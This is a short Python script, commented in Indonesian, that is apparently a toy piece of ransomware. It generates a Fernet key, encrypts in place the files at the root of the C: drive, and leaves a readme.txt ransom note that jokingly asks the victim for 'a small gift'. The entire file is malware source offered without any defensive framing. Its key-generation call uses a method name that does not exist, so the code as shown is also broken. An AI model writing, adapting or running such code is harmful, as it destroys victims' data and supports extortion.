from cryptography.fernet import Fernet
import os

def generar_key():
    key = Fernet.generar_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

def cargar_key():
    return open('key.key', 'rb').read()

def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

if __name__ == '__main__':
    path_to_encrypt = 'C:\\' #path yang mau lu enc, bebas deh, defaultnya drive C
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '\\' + item for item in items]
    generar_key()
    key = cargar_key()
    encrypt(full_path, key)
    with open(path_to_encrypt + '\\' + 'readme.txt', 'w') as file:
        file.write('Aduhh, aku ga sengaja mengacaukan file kamu hehe :3 #~#\n')
        file.write('Kasi aku hadiah kecil uwu')